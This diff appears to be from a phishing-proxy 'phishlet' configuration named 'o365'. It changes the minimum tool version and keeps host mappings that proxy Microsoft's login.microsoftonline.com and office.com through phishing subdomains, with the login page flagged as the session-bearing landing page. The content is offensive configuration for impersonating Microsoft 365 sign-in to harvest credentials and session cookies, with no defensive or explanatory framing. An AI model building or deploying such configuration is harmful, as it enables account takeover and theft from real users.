@@ -1,6 +1,6 @@
 name: 'o365'
 author: '@wilecurity'
-min_ver: '8.4.0'
+min_ver: '2.4.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing:false}
